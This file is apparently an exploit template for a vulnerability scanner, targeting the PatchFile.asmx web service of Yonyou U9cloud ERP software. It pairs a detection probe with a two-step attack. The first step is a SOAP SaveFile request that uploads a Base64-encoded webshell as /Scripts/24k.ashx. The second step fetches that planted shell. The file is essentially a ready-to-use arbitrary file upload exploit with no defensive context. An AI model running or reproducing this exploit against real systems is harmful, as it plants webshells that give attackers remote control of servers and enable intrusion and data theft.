yongyou/用友U9cloud_PatchFile.asmx文件写入.json

{  "name":"用友U9cloud_PatchFile.asmx文件写入",  "tag":"yongyou",  "type":"upload",  "poc": {    "pocGet": "/CS/Office/AutoUpdates/back/PatchFile.asmx",    "header": {      "Upgrade-Insecure-Requests": "1",      "User-Agent": "Mozilla/5.0 (Linux;",      "Accept-Encoding": "gzip, deflate",      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",      "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"    },    "status_code":"200",    "pattern": "(SaveFile)"  },  "exp": {    "step1": {      "expGet": "/CS/Office/AutoUpdates/back/PatchFile.asmx",      "expPost": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\r\n  <soap:Body>\r\r\n    <SaveFile xmlns=\"http://tempuri.org/\">\r\r\n      <binData>{{webshell:Base64Encode}}</binData>\r\r\n      <path>/Scripts</path>\r\r\n      <fileName>24k.ashx</fileName>\r\r\n    </SaveFile>\r\r\n  </soap:Body>\r\r\n</soap:Envelope>",      "header": {        "content-type": "text/xml; charset=utf-8",        "User-Agent": "Mozilla/5.0 (Linux;",        "Accept-Encoding": "gzip, deflate",        "Accept": "*/*",        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",        "SOAPAction" : "\"http://tempuri.org/SaveFile\""      },      "status_code":"200",      "pattern": "(true)"    },    "step2": {      "expGet": "/Scripts/24k.ashx",      "header": {        "Upgrade-Insecure-Requests": "1",        "content-type": "application/x-www-form-urlencoded",        "User-Agent": "Mozilla/5.0 (Linux;",        "Accept-Encoding": "gzip, deflate",        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"      },      "status_code":"200",      "pattern": "()"    }  }}